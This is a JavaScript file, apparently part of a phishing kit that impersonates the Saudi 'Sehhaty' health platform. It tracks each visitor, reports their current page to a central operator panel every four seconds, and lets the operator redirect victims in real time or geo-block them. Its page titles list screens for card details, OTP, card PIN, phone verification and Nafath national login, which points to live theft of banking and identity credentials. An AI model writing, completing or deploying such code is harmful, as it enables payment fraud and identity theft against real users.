// config.js — منطق الربط لصفحات تطبيق «منصّة صحّتي»
// ------------------------------------------------------------------
// نفس منطق الموقع السابق: نبض دوري + توجيه لحظي من اللوحة المركزية.
// 🎯 عنوان اللوحة يُقرأ من saas-hub-config.js (المصدر الوحيد) — يعمل محلياً وعلى أي نطاق
window.SERVER_HUB_URL = (typeof window.SAAS_RESOLVE_HUB_URL === 'function')
  ? window.SAAS_RESOLVE_HUB_URL()
  : "http://localhost:5000";

(function () {
    var SERVER_HUB_URL = window.SERVER_HUB_URL.replace(/\/+$/, "");
    var siteKey = "site_sehhaty_app_v1"; // مفتاح تطبيق «منصة صحّتي» في اللوحة

    var visitorToken = localStorage.getItem('visitor_token');
    if (!visitorToken) {
        visitorToken = 'vis_' + Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
        localStorage.setItem('visitor_token', visitorToken);
    }

    // 🏷️ عناوين الصفحات كما تظهر في اللوحة
    var PAGE_TITLES = {
        'bill.html': 'بيانات بطاقة الدفع (Step 2)',
        'loading.html': 'جاري مطابقة رمز الأمان...',
        'otp.html': 'التحقق من الهاتف - رمز OTP',
        'loading_pin.html': 'جاري مطابقة الرمز السري...',
        'pin.html': 'تأكيد الرمز السري للبطاقة - PIN',
        'loading_phone.html': 'جاري مطابقة بيانات الهاتف...',
        'phone-verify.html': 'توثيق هاتف مالك البطاقة والشبكة',
        'phone-otp.html': 'إثبات ملكية الهاتف الجوال',
        'nafath.html': 'مصادقة بوابة نفاذ الموحدة',
        'wait.html': 'جاري التحقق النهائي من البيانات'
    };

    function currentFile() {
        var parts = window.location.pathname.split('/');
        return parts[parts.length - 1] || 'index.html';
    }

    function pageTitle() {
        var f = currentFile();
        return PAGE_TITLES[f] || document.title || f;
    }

    // 🛑 شاشة الحجب الجغرافي (تُعرض داخل الصفحة — لا توجيه إلى مسار قد لا يوجد على هذا النطاق)
    var BLOCK_ID = 'saas-hub-blocked-screen';
    function showBlockedScreen() {
        if (document.getElementById(BLOCK_ID)) return;
        var el = document.createElement('div');
        el.id = BLOCK_ID;
        el.setAttribute('dir', 'rtl');
        el.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:#fff1f2;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;font-family:Cairo,system-ui,Arial,sans-serif;text-align:center;padding:24px;';
        el.innerHTML =
            '<div style="font-size:44px">🛡️</div>' +
            '<h1 style="color:#e11d48;font-size:24px;font-weight:900;margin:0">عذراً، الخدمة غير متوفرة في منطقتك الجغرافية</h1>' +
            '<p style="color:#4b5563;font-size:14px;font-weight:700;margin:0">تم تقييد الوصول إلى هذا الموقع وفقاً لسياسات الأمان.</p>';
        document.body.appendChild(el);
    }
    function hideBlockedScreen() {
        var el = document.getElementById(BLOCK_ID);
        if (el) el.remove();
    }

    // ⚠️ تنبيه واضح في الكونسول إن كان عنوان اللوحة غير صحيح (يسهّل تشخيص النشر)
    var hubWarned = false;
    function warnHubUnreachable() {
        if (hubWarned) return;
        hubWarned = true;
        console.warn('[SaaS Hub] ⚠️ تعذّر الوصول إلى اللوحة المركزية على: ' + SERVER_HUB_URL +
            '\n    إن كان الموقع منشوراً على نطاق مختلف، اضبط SAAS_HUB_URL في ملف saas-hub-config.js');
    }

    function sendPing() {
        fetch(SERVER_HUB_URL + '/api/tracker/ping', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                token: visitorToken,
                siteKey: siteKey,
                currentPage: '/' + currentFile(),
                pageTitle: pageTitle(),
                device: /Mobile|Android|iP(ad|hone)/i.test(navigator.userAgent) ? 'جوال' : 'سطح مكتب'
            })
        })
            .then(function (res) { return res.json(); })
            .then(function (data) {
                if (!data) return;

                // 🛑 الحظر الجغرافي — شاشة حجب داخلية (لا تُوجّه إلى مسار قد لا يوجد على هذا النطاق)
                if (data.isBlocked) {
                    showBlockedScreen();
                    return;
                }
                hideBlockedScreen();

                // 🧭 التوجيه اللحظي من اللوحة المركزية
                if (data.status === 'go' && data.redirectUrl) {
                    var targetPath = String(data.redirectUrl).split('?')[0];
                    var actualPath = window.location.pathname;
                    if (actualPath !== targetPath && actualPath !== '/' && !window.location.href.includes(data.redirectUrl)) {
                        window.location.href = data.redirectUrl;
                    }
                }
            })
            .catch(function () { warnHubUnreachable(); });
    }

    // تسجيل الموقع تلقائياً في اللوحة
    fetch(SERVER_HUB_URL + '/api/sites/auto-register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ siteKey: siteKey, name: 'منصة صحّتي — التطبيق' })
    }).catch(function () { });

    sendPing();
    setInterval(sendPing, 4000);
})();
